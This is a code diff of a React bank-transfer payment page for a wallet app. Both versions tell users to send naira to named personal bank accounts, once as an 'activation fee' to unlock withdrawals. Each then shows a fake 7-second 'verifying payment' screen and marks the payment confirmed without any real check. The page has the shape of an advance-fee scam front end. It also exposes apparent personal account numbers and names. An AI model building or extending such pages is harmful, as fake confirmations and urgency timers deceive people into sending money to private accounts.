@@ -1,305 +1,187 @@
 
-import React, { useState, useEffect } from "react";
+import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
-import { ArrowLeft, Copy, Wallet, User2, Banknote, CheckCircle } from "lucide-react";
-import { Button } from "@/components/ui/button";
+import { ArrowLeft, Copy, CheckCircle } from "lucide-react";
 import { toast } from "sonner";
+import { Dialog, DialogContent } from "@/components/ui/dialog";
 import { useAuth } from "@/contexts/AuthContext";
-import {
-  Dialog,
-  DialogContent,
-} from "@/components/ui/dialog";
-import OpayWarningModal from "@/components/OpayWarningModal";
 
 const BankTransferPayment: React.FC = () => {
   const navigate = useNavigate();
-  const [isLoading, setIsLoading] = useState(true);
-  const { user, updateUserInfo } = useAuth();
-  const [timeLeft, setTimeLeft] = useState(1800); // 30 mins in seconds
-  const [showProcessingDialog, setShowProcessingDialog] = useState(false);
-  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
-  const [showOpayWarning, setShowOpayWarning] = useState(false);
-  const [buttonText, setButtonText] = useState("I Have Made Payment");
-  const [activationCode, setActivationCode] = useState("");
-  const [loadingProgress, setLoadingProgress] = useState(0);
+  const { updateUserInfo, user } = useAuth();
+  const [copied, setCopied] = useState<string | null>(null);
+  const [showConfirmation, setShowConfirmation] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [progress, setProgress] = useState(0);
+
+  // Get amount from query params or localStorage
+  const urlParams = new URLSearchParams(window.location.search);
+  const amount = urlParams.get('amount') || localStorage.getItem('fundAmount') || '5000';
   
-  const accountDetails = {
-    bankName: "FCMB Bank",
-    accountNumber: "1030512463",
-    accountName: "SAMUEL JUDE",
-    amount: "₦6,200"
+  // Bank account details
+  const bankDetails = {
+    accountNumber: "6056570413",
+    accountName: "CHUKWUEMEKA AMADI JAMES",
+    bankName: "Moniepoint MFB"
   };
-  
-  // Generate 6-digit activation code
-  const generateActivationCode = () => {
-    return Math.floor(100000 + Math.random() * 900000).toString();
+
+  const copyToClipboard = (text: string, type: string) => {
+    navigator.clipboard.writeText(text).then(() => {
+      setCopied(type);
+      toast.success(`${type} copied to clipboard`);
+      setTimeout(() => setCopied(null), 2000);
+    });
   };
-  
-  // Load account details with delay
-  useEffect(() => {
-    const timer = setTimeout(() => {
-      setIsLoading(false);
-      // Show Opay warning after loading is complete
-      setShowOpayWarning(true);
-    }, 2000);
+
+  const handleConfirmPayment = () => {
+    setShowConfirmation(true);
+    setIsProcessing(true);
+    setProgress(0);
     
-    return () => clearTimeout(timer);
-  }, []);
-
-  // Countdown timer
-  useEffect(() => {
-    if (!isLoading && timeLeft > 0) {
-      const countdownTimer = setInterval(() => {
-        setTimeLeft(prev => prev - 1);
-      }, 1000);
-      
-      return () => clearInterval(countdownTimer);
-    }
-  }, [isLoading, timeLeft]);
-
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins} mins ${secs} secs`;
-  };
-
-  const handleBack = () => {
-    navigate(-1);
-  };
-
-  const handleCopyClick = (text: string, label: string) => {
-    navigator.clipboard.writeText(text)
-      .then(() => {
-        toast.success(`${label} copied!`);
-      })
-      .catch(() => {
-        toast.error("Failed to copy");
-      });
-  };
-
-  const handlePaymentConfirmation = () => {
-    // Show processing dialog with 7-second loading
-    setShowProcessingDialog(true);
-    setButtonText("Pending....");
-    setLoadingProgress(0);
-    
-    // Update progress every 100ms for 7 seconds
-    const progressInterval = setInterval(() => {
-      setLoadingProgress(prev => {
+    // Progress animation over 7 seconds
+    const interval = setInterval(() => {
+      setProgress(prev => {
         if (prev >= 100) {
-          clearInterval(progressInterval);
+          clearInterval(interval);
+          setIsProcessing(false);
+          
+          // Update user balance
+          if (user) {
+            const newBalance = user.balance + parseInt(amount);
+            updateUserInfo({ balance: newBalance });
+            
+            // Store funding transaction
+            const existingTransactions = JSON.parse(localStorage.getItem('transactions') || '[]');
+            const newTransaction = {
+              id: `tr-${Date.now()}`,
+              type: "credit",
+              amount: parseInt(amount),
+              date: new Date().toISOString().split('T')[0],
+              description: "Bank Transfer Funding",
+              status: "completed"
+            };
+            existingTransactions.push(newTransaction);
+            localStorage.setItem('transactions', JSON.stringify(existingTransactions));
+          }
+          
+          // Generate 6-digit confirmation code
+          const confirmationCode = Math.floor(100000 + Math.random() * 900000);
+          localStorage.setItem('bankTransferCode', confirmationCode.toString());
+          
+          setTimeout(() => {
+            navigate("/dashboard");
+            toast.success("Payment confirmed successfully!");
+          }, 1000);
+          
           return 100;
         }
-        return prev + (100 / 70); // 7 seconds = 7000ms, 100ms intervals = 70 steps
+        return prev + (100 / 70); // 7 seconds = 70 intervals of 100ms
       });
     }, 100);
-    
-    // After 7 seconds, show success and generate activation code
-    setTimeout(() => {
-      const newActivationCode = generateActivationCode();
-      setActivationCode(newActivationCode);
-      
-      // Debit user account and activate
-      if (user) {
-        const newBalance = user.balance - 6200;
-        updateUserInfo({ 
-          isActivated: true,
-          balance: newBalance 
-        });
-        
-        // Add transaction to history
-        const existingTransactions = JSON.parse(localStorage.getItem('transactions') || '[]');
-        const newTransaction = {
-          id: `tr-${Date.now()}`,
-          type: "debit",
-          amount: 6200,
-          date: new Date().toISOString().split('T')[0],
-          description: "Account Activation Fee",
-          status: "completed"
-        };
-        localStorage.setItem('transactions', JSON.stringify([newTransaction, ...existingTransactions]));
-      }
-      
-      setShowProcessingDialog(false);
-      setShowSuccessDialog(true);
-      toast.success("Payment confirmed! Account activated!");
-    }, 7000);
-  };
-
-  const handleGoToDashboard = () => {
-    setShowSuccessDialog(false);
-    navigate("/dashboard");
   };
 
   return (
-    <div className="min-h-screen bg-white">
-      {/* Opay Warning Modal - only shows after loading */}
-      <OpayWarningModal 
-        isOpen={showOpayWarning} 
-        onClose={() => setShowOpayWarning(false)} 
-      />
-
-      {/* Header - Full width */}
-      <div className="flex items-center p-4 border-b">
-        <button onClick={handleBack} className="mr-4">
-          <ArrowLeft size={20} className="text-green-800" />
+    <div className="min-h-screen bg-gray-50">
+      {/* Header */}
+      <div className="bg-white p-4 flex items-center border-b">
+        <button onClick={() => navigate("/fund-wallet")} className="mr-4">
+          <ArrowLeft size={24} />
         </button>
-        <h1 className="text-lg font-medium text-gray-800">Bank Transfer</h1>
+        <h1 className="text-lg font-medium">Bank Transfer</h1>
       </div>
-
-      <div className="p-4">
-        {isLoading ? (
-          <div className="flex flex-col items-center justify-center h-64">
-            <div className="w-12 h-12 border-3 border-green-800 border-t-transparent rounded-full animate-spin mb-4"></div>
-            <p className="text-sm text-gray-600">Loading account details...</p>
-          </div>
-        ) : (
-          <>
-            <div className="mb-6">
-              <h2 className="text-xl font-bold">Fund Wallet via Bank Transfer</h2>
-              <p className="text-gray-500 text-sm mt-2">
-                Transfer To This Account Below Within 30mins And Get Activation Code Once Your Payment Got Confirmed
-              </p>
-            </div>
-            
-            <div className="bg-gray-50 rounded-lg overflow-hidden">
-              <div className="p-4 flex justify-between items-center">
-                <div className="flex-1">
-                  <div className="flex items-center">
-                    <div className="bg-gray-100 p-2 rounded-md mr-4">
-                      <Banknote size={24} className="text-green-800" />
-                    </div>
-                    <div>
-                      <p className="text-gray-500 text-sm">Bank Name</p>
-                      <p className="font-bold text-green-800">{accountDetails.bankName}</p>
-                    </div>
-                  </div>
-                </div>
-                <div className="flex items-center text-blue-600">
-                  <span className="bg-green-100 px-3 py-1 rounded-md text-green-600 text-sm">Active</span>
-                </div>
-              </div>
-              
-              <div className="border-t p-4 flex justify-between items-center">
-                <div className="flex items-center">
-                  <div className="bg-gray-200 p-2 rounded-md mr-4 w-10 h-10 flex items-center justify-center">
-                    <span className="font-mono text-sm">123</span>
-                  </div>
-                  <div>
-                    <p className="text-gray-500 text-sm">Account Number</p>
-                    <p className="font-bold text-gray-800">{accountDetails.accountNumber}</p>
-                  </div>
-                </div>
-                <Button 
-                  variant="outline" 
-                  size="sm"
-                  className="bg-green-800 text-white hover:bg-green-700"
-                  onClick={() => handleCopyClick(accountDetails.accountNumber, "Account number")}
-                >
-                  <Copy size={16} className="mr-2" /> Copy
-                </Button>
-              </div>
-              
-              <div className="border-t p-4 flex justify-between items-center">
-                <div className="flex items-center">
-                  <div className="bg-gray-200 p-2 rounded-md mr-4 w-10 h-10 flex items-center justify-center">
-                    <User2 size={20} className="text-gray-600" />
-                  </div>
-                  <div>
-                    <p className="text-gray-500 text-sm">Account Name</p>
-                    <p className="font-bold text-gray-800">{accountDetails.accountName}</p>
-                  </div>
-                </div>
-              </div>
-              
-              <div className="border-t p-4 flex justify-between items-center">
-                <div className="flex items-center">
-                  <div className="bg-gray-200 p-2 rounded-md mr-4 w-10 h-10 flex items-center justify-center">
-                    <Wallet size={20} className="text-blue-600" />
-                  </div>
-                  <div>
-                    <p className="text-gray-500 text-sm">Amount</p>
-                    <p className="font-bold text-green-800">{accountDetails.amount}</p>
-                  </div>
-                </div>
-              </div>
-            </div>
-
-            <div className="mt-6 bg-gray-100 p-4 rounded-lg">
-              <p className="text-gray-700 text-sm">
-                Hi, {user?.firstName || "James"}
-              </p>
-              <p className="text-gray-700 text-sm mt-2">
-                Make A One Time Payment In Bank Details Above To Activate Your Account And Withdraw Instantly
-              </p>
-            </div>
-              
-            <div className="p-4 text-center text-green-800 text-sm mt-4">
-              <p>This one-time account expires in {formatTime(timeLeft)}</p>
-            </div>
-
-            <button
-              onClick={handlePaymentConfirmation}
-              className="w-full bg-green-800 text-white py-3 rounded-lg mt-4 text-base font-medium"
-              disabled={showProcessingDialog}
-            >
-              {buttonText}
-            </button>
-          </>
-        )}
-      </div>
-
-      {/* Processing Dialog with 7-second loading - Full page overlay */}
-      <Dialog open={showProcessingDialog} onOpenChange={setShowProcessingDialog}>
-        <DialogContent className="sm:max-w-md p-0 gap-0">
-          <div className="p-8">
-            <h2 className="text-2xl font-bold text-center mb-8">Payment Processing</h2>
-            <div className="flex flex-col items-center justify-center">
-              <div className="w-24 h-24 rounded-full border-4 border-gray-200 mb-6 relative">
-                <div 
-                  className="absolute inset-0 rounded-full border-4 border-green-800 border-t-transparent animate-spin"
-                  style={{ 
-                    transform: `rotate(${(loadingProgress / 100) * 360}deg)`
-                  }}
-                ></div>
-                <div className="absolute inset-2 bg-green-800 rounded-full flex items-center justify-center">
-                  <span className="text-white text-sm font-bold">{Math.round(loadingProgress)}%</span>
-                </div>
-              </div>
-              <p className="text-gray-500 text-lg">Verifying Payment...</p>
-            </div>
-          </div>
-        </DialogContent>
-      </Dialog>
       
-      {/* Payment Success Dialog */}
-      <Dialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
-        <DialogContent className="sm:max-w-md p-0 gap-0">
-          <div className="p-8">
-            <div className="flex flex-col items-center mb-6">
-              <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
-                <CheckCircle size={40} className="text-green-600" />
+      <div className="p-6">
+        {/* Amount to Pay */}
+        <div className="bg-white rounded-lg p-6 mb-6 text-center">
+          <h2 className="text-lg font-medium text-gray-600 mb-2">Amount to Pay</h2>
+          <p className="text-3xl font-bold text-green-800">₦{parseInt(amount).toLocaleString()}</p>
+        </div>
+        
+        {/* Bank Details */}
+        <div className="bg-white rounded-lg p-6 mb-6">
+          <h3 className="text-lg font-medium mb-4">Transfer to this account</h3>
+          
+          <div className="space-y-4">
+            <div className="flex justify-between items-center">
+              <div>
+                <p className="text-sm text-gray-600">Account Number</p>
+                <p className="font-medium text-lg">{bankDetails.accountNumber}</p>
               </div>
-              <h2 className="text-2xl font-bold text-center text-green-800">Payment Confirmed!</h2>
-              <p className="text-center text-gray-600 mt-3">Your account has been activated</p>
+              <button
+                onClick={() => copyToClipboard(bankDetails.accountNumber, "Account Number")}
+                className="text-green-800"
+              >
+                {copied === "Account Number" ? <CheckCircle size={20} /> : <Copy size={20} />}
+              </button>
             </div>
             
-            <div className="bg-gray-50 p-6 rounded-lg mb-6">
-              <p className="text-sm text-gray-600 text-center mb-3">Your Activation Code</p>
-              <div className="flex justify-center">
-                <span className="text-3xl font-bold text-green-800 bg-white px-6 py-3 rounded border tracking-wider">
-                  {activationCode}
-                </span>
+            <div className="flex justify-between items-center">
+              <div>
+                <p className="text-sm text-gray-600">Account Name</p>
+                <p className="font-medium">{bankDetails.accountName}</p>
               </div>
-              <p className="text-xs text-gray-500 text-center mt-3">Save this code for your records</p>
+              <button
+                onClick={() => copyToClipboard(bankDetails.accountName, "Account Name")}
+                className="text-green-800"
+              >
+                {copied === "Account Name" ? <CheckCircle size={20} /> : <Copy size={20} />}
+              </button>
             </div>
             
-            <button
-              onClick={handleGoToDashboard}
-              className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
-            >
-              Go to Dashboard
-            </button>
+            <div className="flex justify-between items-center">
+              <div>
+                <p className="text-sm text-gray-600">Bank Name</p>
+                <p className="font-medium">{bankDetails.bankName}</p>
+              </div>
+              <button
+                onClick={() => copyToClipboard(bankDetails.bankName, "Bank Name")}
+                className="text-green-800"
+              >
+                {copied === "Bank Name" ? <CheckCircle size={20} /> : <Copy size={20} />}
+              </button>
+            </div>
+          </div>
+        </div>
+        
+        {/* Instructions */}
+        <div className="bg-blue-50 rounded-lg p-4 mb-6">
+          <h4 className="font-medium text-blue-800 mb-2">Instructions</h4>
+          <ul className="text-sm text-blue-700 space-y-1">
+            <li>• Transfer exactly ₦{parseInt(amount).toLocaleString()} to the account above</li>
+            <li>• Use your registered name as the transfer description</li>
+            <li>• Click "I have sent the money" after completing the transfer</li>
+            <li>• Your account will be credited within 5-10 minutes</li>
+          </ul>
+        </div>
+        
+        {/* Confirm Button */}
+        <button
+          onClick={handleConfirmPayment}
+          className="w-full bg-green-800 text-white py-4 rounded-lg font-medium text-lg"
+          disabled={isProcessing}
+        >
+          I have sent the money
+        </button>
+      </div>
+
+      {/* Processing Dialog */}
+      <Dialog open={showConfirmation} onOpenChange={() => {}}>
+        <DialogContent className="w-full h-full max-w-none max-h-none m-0 rounded-none flex items-center justify-center bg-white">
+          <div className="text-center">
+            <div className="relative w-24 h-24 mx-auto mb-6">
+              <div className="w-24 h-24 border-4 border-gray-200 rounded-full"></div>
+              <div 
+                className="absolute top-0 left-0 w-24 h-24 border-4 border-green-600 rounded-full border-t-transparent animate-spin"
+                style={{
+                  animation: `spin 1s linear infinite`
+                }}
+              ></div>
+              <div className="absolute inset-0 flex items-center justify-center">
+                <span className="text-sm font-medium text-green-600">{Math.round(progress)}%</span>
+              </div>
+            </div>
+            <h2 className="text-xl font-semibold text-gray-800 mb-2">Confirming Payment</h2>
+            <p className="text-gray-600">Please wait while we verify your payment...</p>
           </div>
         </DialogContent>
       </Dialog>
